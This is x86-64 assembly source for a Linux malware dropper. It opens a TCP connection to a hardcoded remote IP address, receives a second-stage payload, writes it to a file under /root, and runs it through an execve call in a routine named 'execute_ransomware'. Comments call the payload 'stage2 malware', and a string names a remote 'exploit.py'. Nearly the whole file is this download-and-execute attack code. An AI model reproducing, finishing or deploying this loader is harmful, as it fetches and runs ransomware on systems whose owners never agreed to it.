global _start

struc sockaddr_in
	.sin_family resw 1
	.sin_port resw 1
	.sin_addr resd 1
	.sin_zero resb 8
endstruc

section .bss
	sock resw 2
	client resw 2
	port resw 2
	bytes_read resw 2
	file_buff resb 8092
	stage2_fd resw 1
	file_data resb 8092

section .data
	malware_name db '/root/s2.py', 0x0 ;null termination is necessary - will solve this later at time of sc conv
	;malware_name db '/root/stage2.rnswr', 0x0 ;null termination is necessary - will solve this later at time of sc conv
	;file_data db 'Hi I am stage2 malware', 0x0
	pop_sa istruc sockaddr_in
		at sockaddr_in.sin_family, dw 2
		at sockaddr_in.sin_port, dw 0x3905
		;at sockaddr_in.sin_addr, dd 0x1100007f
		;at sockaddr_in.sin_addr, dd 0x1505a8c0
		at sockaddr_in.sin_addr, dd 0x24aa3b0d
		;at sockaddr_in.sin_addr, dd 0xa31e5a0a
		at sockaddr_in.sin_zero, dd 0, 0
	iend
	sockaddr_in_len	equ $ - pop_sa
	
section .text

exit_gracefully:
	xor rax, rax
	add rax, 60
	mov rdi, 1
	syscall

_start:
	mov word [sock], 0
	mov word [client], 0
	mov word [port], 1234
	jmp main

_socket:
	xor rax, rax ;zeroed rax
	mov rax, 41 ;socket syscall no.
	mov rdi, 2 ;AF_INET
	mov rsi, 1 ;SOCK_STREAM
	mov rdx, 0 ;ANY_PROTO
	syscall
	
	;check if call succeeded
	;cmp rax, 0
	;jle _socket_fail
	mov [sock], rax ;save socket fd in sock variable
	
	ret

_connect:
	xor rax, rax
	mov rax, 42
	mov rdi, [sock]
	mov rsi, pop_sa
	mov rdx, sockaddr_in_len
	syscall

	ret
	
_fops:	
	xor rax, rax 
        mov rax, 2
        lea rdi, [malware_name] ; this file needs to be created
        mov rsi, 1
        mov rdx, 1
        syscall

        mov [stage2_fd], rax 

        xor rax, rax 
        mov rax, 1
        mov rdi ,[stage2_fd]
        lea rsi, [file_buff]
        mov rdx, 8092
        syscall
	
	jmp execute_ransomware
	
	ret

print_data:
	mov rax, 1
	mov rdi, 1
	mov rsi, [file_data]
	mov rdx, 8092
	syscall
	;call exit_gracefully

_fcopy:
	mov rax, 45 ; recvfrom syscall no
	mov rdi, [sock] ; socket fd
	lea rsi, [file_buff] ; buffer to copy
	mov [file_data], rsi
	mov rdx, 8092 ; len to copy
	mov r10, 0
	mov r8, 0
	mov r9, 0
	syscall 
	mov [bytes_read], rax	

	mov rax, 1
	mov rdi, 1
	mov rsi, [file_buff]
	mov rdx, 8092
	syscall
	
	call _fops
	;loop _fcopy	
	
	;ret
	jmp print_data
	ret

	loop _fcopy	

connect_to_site:
	
	;create socket
	call _socket

	;call connect API
	call _connect
	call _fcopy 
	;jmp execute_ransomware
	call exit_gracefully

execute_ransomware:
        lea rdi, [malware_name] 
        xor rax, rax 
        add rax, 59
        xor rdx, rdx 
        syscall
main:
	call connect_to_site
	siteurl: db '10.90.30.163/exploit.py', 0xa
